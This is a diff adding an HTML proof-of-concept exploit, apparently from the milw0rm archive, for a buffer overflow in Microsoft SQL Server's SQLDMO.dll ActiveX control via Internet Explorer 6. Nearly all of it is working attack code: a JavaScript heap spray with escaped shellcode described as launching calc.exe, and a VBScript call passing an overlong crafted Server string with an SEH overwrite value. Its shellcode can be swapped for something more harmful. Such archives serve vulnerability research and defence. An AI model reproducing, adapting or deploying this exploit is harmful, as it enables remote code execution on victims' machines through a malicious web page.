@@ -1,0 +1,53 @@
+<!--
+
++ title: Microsoft SQL Server Distributed Management Objects Buffer Overflow
++ Critical: Critical (remote)
++ Impact: MS Internet Explorer 6 -> Code Execute
++ Tested Operating System: Windows XP SP2 KR, Windows 2000 Pro SP4 KR
++ Tested Software: MSDE 2000 SQLDMO.dll (version 2000.80.760.0)
++ Reference & Thanks : 
+     code by rgod http://www.milw0rm.com/exploits/4379
+     code by Trirat Puttaraksa http://www.milw0rm.com/exploits/2426
++ Author: 96sysim (sysim@nate.com)
+
+-->
+
+<html>
+<object classid='clsid:10020200-E260-11CF-AE68-00AA004A34D5' id='SQLServer' /></object>
+
+<SCRIPT language="javascript">
+// Heap Spray 
+// execute "calc.exe"
+shellcode =
+unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
+
+bigblock = unescape("%u9090%u9090");
+headersize = 20;
+slackspace = headersize+shellcode.length;
+while (bigblock.length<slackspace) bigblock+=bigblock;
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace<0x40000) block = block+block+fillblock;
+memory = new Array();
+for (i=0;i<501;i++) memory[i] = block + shellcode;
+</SCRIPT>
+
+
+<script language='vbscript'>
+targetFile = "C:\Programmi\Microsoft SQL Server\80\Tools\Binn\sqldmo.dll"
+prototype  = "Sub Start ( ByVal StartMode As Boolean ,  [ ByVal Server As Variant ] ,  [ ByVal Login As Variant ] ,  [ ByVal Password As Variant ] )"
+memberName = "Start"
+progid     = "SQLDMO.SQLServer"
+argCount   = 4
+
+myseh        = unescape("%u0D0D%u0D0D")   // heap spray range - possible change
+StartMode =True
+Server    ="http://ZZZZ\YYYY\XXXX\WW?W\VVVV\AAAA\AAA\AAAAA\AAAA\AA@AA\tes\test\test\tes.\ttest\MMMM\LLLL\KKK\JJJJ\IIII\HH.H\GGGGG\FFFF\EEEE\DDD\DDDD\BBBB\AAA\A\\\\\\\\\:#$%AAAA\BBBB\CCCC\DD?D\EEEE\FFFF\GGG\\:#$%\HHHHH\IIII\te@st\tes\test\test\tes.aaaabbbbccccddddeeeeffffgggghhhhiiiiaaaaaaaaa" + myseh + "Dmmm" + edx + "nnnBBBB\AAAA\ZZZ\Z\\\\\\\\\:#$%YYYY\XXXX\WWWW\VV?V\UUUU\TTTT\SSS\\:#$%\RRRRR\QQQQ\PP@PP\OOO\NNNN\MMMM\LLL.\KKKKK\JJJJ\IIII\HHH\GGGG\FFFF\EE.E\DDDDD\DDDD\BBBB\AAA\AAAA\AAAA\AAA\A\\\\\\\\\:#$%AAAA\AAAA\AAAA\AA?A\wwww\vvvv\uuu\\:#$%\ttttt\ssss\rr@rr\qqq\pppp\oooo\nnn.\mmmmm\llll\kkkk\jjj\iiii\hhhh\gg.g\fffff\eeee\dddd\ccc\bbbb\aaaa\AAA\A\\\\\\\"
+Login     ="aaaaaaaa"
+Password  ="bbbbbbbb"
+
+SQLServer.Start StartMode ,Server ,Login ,Password
+</script>
+</html>
+
+# milw0rm.com [2007-09-12]
